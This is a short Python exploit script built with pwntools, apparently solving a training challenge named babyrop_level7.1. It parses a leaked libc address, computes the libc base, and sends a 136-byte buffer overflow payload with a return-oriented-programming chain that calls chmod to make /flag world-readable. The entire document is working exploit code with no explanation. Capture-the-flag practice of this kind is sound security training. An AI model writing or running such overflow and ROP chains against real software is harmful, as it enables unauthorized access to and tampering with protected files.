from pwn import *

context.arch = "amd64"

elf = ELF("/challenge/babyrop_level7.1")

rop = ROP(elf)

io = elf.process()

buff_len = 136
io.recvuntil("is: ")
leak = int(io.recvuntil(".")[:-1].decode(), 16)
libc = elf.libc
elf.bss()

libc.address = leak - libc.symbols.system
gen = libc.search("chmod")
print(hex(next(gen)))
rop.rdi = p64(0x4020d1)
rop.rsi = 0o777
rop.call(libc.symbols.chmod)
#print(chmod)
PAYLOAD = b"/flag\00"+b'A'*(buff_len-len("/flag\00")) + rop.chain()
with open("test.bin", "wb") as f:
    f.write(PAYLOAD)
io.send(PAYLOAD)
io.interactive()